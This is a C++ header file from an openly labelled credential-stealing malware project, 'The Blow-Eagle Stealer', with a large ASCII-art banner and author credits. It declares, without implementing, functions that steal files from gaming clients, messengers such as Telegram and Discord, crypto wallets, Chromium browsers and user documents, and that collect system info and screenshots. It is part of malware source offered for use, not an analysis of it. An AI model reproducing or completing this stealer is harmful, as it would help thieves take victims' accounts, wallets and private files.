/*
|==================================================================================================================|
|████████╗██╗░░██╗███████╗  ██████╗░██╗░░░░░░█████╗░░██╗░░░░░░░██╗░░░░░░███████╗░█████╗░░██████╗░██╗░░░░░███████╗ |
|╚══██╔══╝██║░░██║██╔════╝  ██╔══██╗██║░░░░░██╔══██╗░██║░░██╗░░██║░░░░░░██╔════╝██╔══██╗██╔════╝░██║░░░░░██╔════╝ |
|░░░██║░░░███████║█████╗░░  ██████╦╝██║░░░░░██║░░██║░╚██╗████╗██╔╝█████╗█████╗░░███████║██║░░██╗░██║░░░░░█████╗░░ |
|░░░██║░░░██╔══██║██╔══╝░░  ██╔══██╗██║░░░░░██║░░██║░░████╔═████║░╚════╝██╔══╝░░██╔══██║██║░░╚██╗██║░░░░░██╔══╝░░ |
|░░░██║░░░██║░░██║███████╗  ██████╦╝███████╗╚█████╔╝░░╚██╔╝░╚██╔╝░░░░░░░███████╗██║░░██║╚██████╔╝███████╗███████╗ |
|░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═════╝░╚══════╝░╚════╝░░░░╚═╝░░░╚═╝░░░░░░░░╚══════╝╚═╝░░╚═╝░╚═════╝░╚══════╝╚══════╝ |
|                                                                                                                  |
|                               ░██████╗████████╗███████╗░█████╗░██╗░░░░░███████╗██████╗░                          |
|                               ██╔════╝╚══██╔══╝██╔════╝██╔══██╗██║░░░░░██╔════╝██╔══██╗                          |
|                               ╚█████╗░░░░██║░░░█████╗░░███████║██║░░░░░█████╗░░██████╔╝                          |
|                               ░╚═══██╗░░░██║░░░██╔══╝░░██╔══██║██║░░░░░██╔══╝░░██╔══██╗                          |
|                               ██████╔╝░░░██║░░░███████╗██║░░██║███████╗███████╗██║░░██║                          |
|                               ╚═════╝░░░░╚═╝░░░╚══════╝╚═╝░░╚═╝╚══════╝╚══════╝╚═╝░░╚═╝                          |
|==================================================================================================================|

-----------------------------------------------------------------
|by: Nick_Vinesmoke                                             |
|Autor github: https://github.com/Nick-Vinesmoke                |
|Original repo: https://github.com/Nick-Vinesmoke/The-Blow-Eagle|
-----------------------------------------------------------------
*/

// all targets 
#include <string>

namespace cursystem
{
	/// <summary>
	/// gets processes
	/// </summary>
	void GetProcesses();

	/// <summary>
	/// gets all installed progs in program files
	/// </summary>
	void GetProgs();


	/// <summary>
	/// gets all the needed info about the system, hardware and software
	/// </summary>
	/// <param name="sendInfo"></param>
	void GetSysInfo(std::string&);
}

namespace gaming 
{
	/// <summary>
	/// steals BattleNet files
	/// </summary>
	void BattleNet();

	/// <summary>
	/// steals Epic files
	/// </summary>
	void Epic();

	/// <summary>
	/// steals Minecraft files
	/// </summary>
	void Minecraft();

	/// <summary>
	/// steals Steam files
	/// </summary>
	void Steam();

	/// <summary>
	/// steals Ubisoft files
	/// </summary>
	void Ubisoft();
}

namespace messengers 
{
	/// <summary>
	/// steals Telegram files
	/// </summary>
	void Telegram();

	/// <summary>
	/// steals Discord files
	/// </summary>
	void Discord();

	/// <summary>
	/// steals Skype files
	/// </summary>
	void Skype();

	/// <summary>
	/// steals Viber files
	/// </summary>
	void Viber();

	/// <summary>
	/// steals Whatsapp files
	/// </summary>
	void Whatsapp();
}

namespace wallets
{
	/// <summary>
	/// steals Wallets files
	/// </summary>
	void Wallets();
}

namespace images
{
	/// <summary>
	/// do Screenshot
	/// </summary>
	void Screenshot();
}

namespace files
{
	/// <summary>
	/// steals all .txt files in dirs documents, downloads, desktop
	/// </summary>
	void Txt_files();

	/// <summary>
	/// steals all .txt, .docx files from all pc
	/// </summary>
	void File_Grabber();
}

namespace browsers 
{
	/// <summary>
	/// steals all Chromium browsers files
	/// </summary>
	void Chromium();

	/// <summary>
	/// steals all FireFox files
	/// </summary>
	//void FireFox();
}